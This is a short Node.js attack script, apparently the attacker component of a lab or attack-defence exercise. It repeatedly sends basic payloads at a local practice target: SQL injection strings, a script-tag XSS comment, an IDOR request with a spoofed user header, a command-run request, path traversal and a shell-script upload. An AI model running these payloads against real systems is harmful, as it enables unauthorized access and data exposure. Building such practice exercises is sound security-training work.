const axios = require('axios');

const ORCH = process.env.ORCH || process.env.ORCHESTRATOR_URL || 'http://orchestrator:9000';
const MY_TARGET = process.env.MY_TARGET || 'http://localhost:9100';

async function activeService() {
  try {
    const r = await axios.get(`${ORCH}/current`, { timeout: 3000 });
    return r.data.active_service || r.data.service || 'web';
  } catch (_) {
    return 'web';
  }
}

async function post(path, body, headers = {}) {
  const r = await axios.post(`${MY_TARGET}${path}`, body, { timeout: 5000, headers });
  return `${r.status} ${String(r.data).slice(0, 120)}`;
}

async function get(path, headers = {}) {
  const r = await axios.get(`${MY_TARGET}${path}`, { timeout: 5000, headers });
  return `${r.status} ${String(r.data).slice(0, 120)}`;
}

async function attackWeb() {
  console.log('web/login ->', await post('/web/login', { username: "admin' OR '1'='1", password: 'x' }));
  console.log('web/search ->', await get('/web/search?q=%27%20OR%20%271%27%3D%271'));
  console.log('web/comment ->', await post('/web/comment', { comment: '<script>alert(1)</script>' }));
}

async function attackApi() {
  console.log('api/admin ->', await get('/api/admin'));
  console.log('api/idor ->', await get('/api/users/2', { 'X-User-Id': '1' }));
  console.log('api/run ->', await post('/api/run', { cmd: 'whoami' }));
}

async function attackFile() {
  console.log('file/download ->', await get('/file/download?file=../files/sample.txt'));
  const form = new FormData();
  form.append('file', new Blob(['echo hack']), 'poc.sh');
  const r = await fetch(`${MY_TARGET}/file/upload`, { method: 'POST', body: form });
  console.log('file/upload ->', r.status, (await r.text()).slice(0, 120));
}

async function attackDb() {
  console.log('db/query ->', await post('/db/query', { search: "' OR '1'='1" }));
  console.log('db/promote ->', await post('/db/user/2/promote', { requester_id: 1 }));
}

async function tick() {
  const service = await activeService();
  try {
    if (service === 'web') await attackWeb();
    else if (service === 'api') await attackApi();
    else if (service === 'file') await attackFile();
    else if (service === 'db') await attackDb();
    else console.log(`unknown service: ${service}`);
  } catch (e) {
    console.log(`attack error: ${e.message}`);
  }
}

console.log('[attacker.js] started');
setInterval(tick, 3000);
